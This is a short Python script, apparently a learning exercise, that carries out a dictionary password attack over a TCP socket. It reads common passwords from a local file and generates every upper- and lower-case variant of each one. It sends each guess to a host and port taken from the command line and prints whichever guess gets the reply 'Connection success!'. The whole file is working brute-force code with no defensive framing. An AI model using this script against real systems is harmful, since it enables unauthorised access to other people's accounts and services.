import socket
import sys
import string
import itertools
path = "hacking\passwords.txt"
f =open(path,'r')
password = f.read().split("\n")
class Connection():
    def __init__(self, host, port):
        self.hostname = host
        self.port = int(port)
        self.sock = socket.socket()
        self.myList = list(string.ascii_lowercase) + list(str(1234567890))
        self.connect()

    def connect(self):
        with socket.socket() as self.sock:
            address = (self.hostname, self.port)
            self.sock.connect(address)
            self.hacks()

    def send_receive(self, msg):
        data = msg.encode()
        # sending through socket
        self.sock.send(data)
        response = self.sock.recv(1024)
        response = response.decode()
        return response

    def hacks(self):
        for i in password:
            if i.isdigit():
                items = [i]
            else:
                items = list(map(''.join, itertools.product(*zip(i.upper(), i.lower()))))
            for psw in items:
                message = ''.join(psw)
                pass_status = self.send_receive(message)
                if pass_status == 'Connection success!':
                    print(message)
                    quit()


args = sys.argv
connection = Connection(host=args[1], port=args[2])
